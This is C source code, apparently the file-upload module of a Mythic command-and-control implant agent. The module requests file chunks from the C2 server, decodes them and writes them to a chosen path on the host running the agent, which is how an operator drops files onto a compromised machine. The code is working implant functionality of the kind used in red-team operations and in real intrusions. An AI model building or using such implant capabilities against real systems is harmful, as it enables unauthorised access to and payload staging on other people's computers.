#include "upload.h"
#include "agent.h"
#include "b64.h"
#include "cJSON.h"
#include "commands.h"
#include "download.h"
#include "enchiridion.h"
#include "utils.h"
#include <errno.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define UPLOAD_CHUNK_SIZE (512 * 1024)

typedef struct UploadState {
    int fd;
    int total_chunks;
    char task_uuid[UUIDSIZE + 1];
    char file_id[UUIDSIZE + 1];
    char full_path[PATH_MAX];
    Agent *agent;
    struct UploadState *next;
} UploadState;

static UploadState *g_uploads_head = NULL;
static pthread_mutex_t g_uploads_lock = PTHREAD_MUTEX_INITIALIZER;

static void addUploadState(UploadState *us) {
    pthread_mutex_lock(&g_uploads_lock);
    us->next = g_uploads_head;
    g_uploads_head = us;
    pthread_mutex_unlock(&g_uploads_lock);
}

static UploadState *findUploadState(const char *task_uuid) {
    pthread_mutex_lock(&g_uploads_lock);
    for (UploadState *cur = g_uploads_head; cur; cur = cur->next) {
        if (strncmp(cur->task_uuid, task_uuid, UUIDSIZE) == 0) {
            pthread_mutex_unlock(&g_uploads_lock);
            return cur;
        }
    }
    pthread_mutex_unlock(&g_uploads_lock);
    return NULL;
}

static void removeUploadState(const char *task_uuid) {
    pthread_mutex_lock(&g_uploads_lock);
    UploadState **prev = &g_uploads_head;
    for (UploadState *cur = g_uploads_head; cur; cur = cur->next) {
        if (strncmp(cur->task_uuid, task_uuid, UUIDSIZE) == 0) {
            *prev = cur->next;
            pthread_mutex_unlock(&g_uploads_lock);
            close(cur->fd);
            free(cur);
            return;
        }
        prev = &cur->next;
    }
    pthread_mutex_unlock(&g_uploads_lock);
}

// Enqueues an upload chunk request to Mythic asking for chunk_num of file_id.
static int enqueueChunkRequest(Agent *agent, const char *task_uuid,
                               const char *file_id, int chunk_num,
                               const char *full_path) {
    cJSON *upload_obj = cJSON_CreateObject();
    if (!upload_obj)
        return -1;
    cJSON_AddNumberToObject(upload_obj, "chunk_size", UPLOAD_CHUNK_SIZE);
    cJSON_AddStringToObject(upload_obj, "file_id", file_id);
    cJSON_AddNumberToObject(upload_obj, "chunk_num", chunk_num);
    cJSON_AddStringToObject(upload_obj, "full_path", full_path);

    cJSON *json = cJSON_CreateObject();
    if (!json) {
        cJSON_Delete(upload_obj);
        return -1;
    }
    cJSON_AddStringToObject(json, "action", "post_response");
    cJSON *responses = cJSON_AddArrayToObject(json, "responses");
    cJSON *response = cJSON_CreateObject();
    cJSON_AddStringToObject(response, "task_id", task_uuid);
    cJSON_AddItemToObject(response, "upload", upload_obj);
    cJSON_AddItemToArray(responses, response);

    char *json_str = cJSON_PrintUnformatted(json);
    cJSON_Delete(json);
    if (!json_str)
        return -1;

    size_t len;
    char *data = buildOutbound(agent, json_str, &len);
    cJSON_free(json_str);
    if (!data)
        return -1;

    OutgoingChunk *out = malloc(sizeof(OutgoingChunk));
    if (!out) {
        free(data);
        return -1;
    }
    out->payload = data;
    out->payload_len = len;
    out->chunk_id = chunk_num;
    out->next = NULL;
    DBGPRINT("EnqueueUploadReq chunk=%d file_id=%s task=%s", chunk_num, file_id, task_uuid);
    enqueueOutgoing(out);
    return 0;
}

// Called by handleTask when a post_response upload chunk arrives from Mythic.
// Returns: 0 = in progress, 1 = all chunks written, -1 = error.
int processUploadChunk(const char *task_uuid, int total_chunks, int chunk_num,
                       const char *chunk_data, int status_ok) {
    UploadState *us = findUploadState(task_uuid);
    if (!us) {
        DBGPRINT("UploadChunk: no state for task %s (ignoring)", task_uuid);
        return 0;
    }

    DBGPRINT("UploadChunk: task=%s file_id=%s chunk=%d/%d status=%s", task_uuid,
             us->file_id, chunk_num, total_chunks, status_ok ? "success" : "fail");

    if (!status_ok) {
        removeUploadState(task_uuid);
        return -1;
    }

    if (us->total_chunks == 0)
        us->total_chunks = total_chunks;

    // Decode chunk data and write to file
    size_t decoded_len = 0;
    unsigned char *decoded = base64_decode(chunk_data, strlen(chunk_data), &decoded_len);
    if (!decoded) {
        DBGPRINT("UploadChunk: base64_decode failed chunk=%d task=%s", chunk_num, task_uuid);
        removeUploadState(task_uuid);
        return -1;
    }

    ssize_t written = 0;
    while (written < (ssize_t)decoded_len) {
        ssize_t n = write(us->fd, decoded + written, decoded_len - (size_t)written);
        if (n < 0) {
            DBGPRINT("UploadChunk: write error chunk=%d task=%s: %s", chunk_num, task_uuid,
                     strerror(errno));
            free(decoded);
            removeUploadState(task_uuid);
            return -1;
        }
        written += n;
    }
    free(decoded);

    if (chunk_num >= us->total_chunks) {
        DBGPRINT("UploadChunk: all %d chunks written for task %s", us->total_chunks, task_uuid);
        removeUploadState(task_uuid);
        return 1;
    }

    // Request next chunk
    if (enqueueChunkRequest(us->agent, us->task_uuid, us->file_id,
                            chunk_num + 1, us->full_path) != 0) {
        DBGPRINT("UploadChunk: enqueue failed chunk=%d task=%s", chunk_num + 1, task_uuid);
        removeUploadState(task_uuid);
        return -1;
    }

    return 0;
}

// Returns 1 if proceeding asynchronously (caller must NOT call sendResponse).
// Returns 0 if failed synchronously (caller should call sendResponse with the error).
int upload(char *file_id, char *remote_path, char *task_uuid, Agent *agent,
           TaskResponse *resp) {
    resp->output = malloc(ERR_MSG_SIZE);
    if (!resp->output) {
        resp->status = -1;
        return 0;
    }

    // Build absolute path for Mythic's records and local file creation
    char full_path[PATH_MAX];
    if (remote_path[0] == '/') {
        if (strlen(remote_path) >= PATH_MAX) {
            memcpy(resp->output, "Path too long", sizeof("Path too long"));
            resp->status = -1;
            return 0;
        }
        strncpy(full_path, remote_path, PATH_MAX - 1);
        full_path[PATH_MAX - 1] = '\0';
    } else {
        if (getcwd(full_path, sizeof(full_path)) == NULL) {
            DBGPRINT("upload: getcwd failed: %s", strerror(errno));
            memcpy(resp->output, "Could not resolve path", sizeof("Could not resolve path"));
            resp->status = -1;
            return 0;
        }
        size_t cwdlen = strlen(full_path);
        if (cwdlen + 1 + strlen(remote_path) + 1 > PATH_MAX) {
            memcpy(resp->output, "Path too long", sizeof("Path too long"));
            resp->status = -1;
            return 0;
        }
        full_path[cwdlen] = '/';
        strncpy(full_path + cwdlen + 1, remote_path, PATH_MAX - cwdlen - 2);
        full_path[PATH_MAX - 1] = '\0';
    }

    int fd = open(full_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd == -1) {
        DBGPRINT("upload: open failed for %s: %s", full_path, strerror(errno));
        memcpy(resp->output, "Could not open file for writing", sizeof("Could not open file for writing"));
        resp->status = -1;
        return 0;
    }

    UploadState *us = calloc(1, sizeof(UploadState));
    if (!us) {
        DBGPRINT("upload: failed to allocate state for %s", full_path);
        memcpy(resp->output, "Memory allocation failed", sizeof("Memory allocation failed"));
        close(fd);
        resp->status = -1;
        return 0;
    }

    us->fd = fd;
    us->agent = agent;
    strncpy(us->task_uuid, task_uuid, UUIDSIZE);
    strncpy(us->file_id, file_id, UUIDSIZE);
    strncpy(us->full_path, full_path, PATH_MAX - 1);

    if (enqueueChunkRequest(agent, task_uuid, file_id, 1, full_path) != 0) {
        DBGPRINT("upload: enqueue failed for %s", full_path);
        memcpy(resp->output, "Upload request failed", sizeof("Upload request failed"));
        close(fd);
        free(us);
        resp->status = -1;
        return 0;
    }

    addUploadState(us);
    DBGPRINT("Upload initiated: %s file_id=%s task=%s", full_path, file_id, task_uuid);

    free(resp->output);
    resp->output = NULL;
    return 1; // async — completion driven by processUploadChunk via handleTask
}
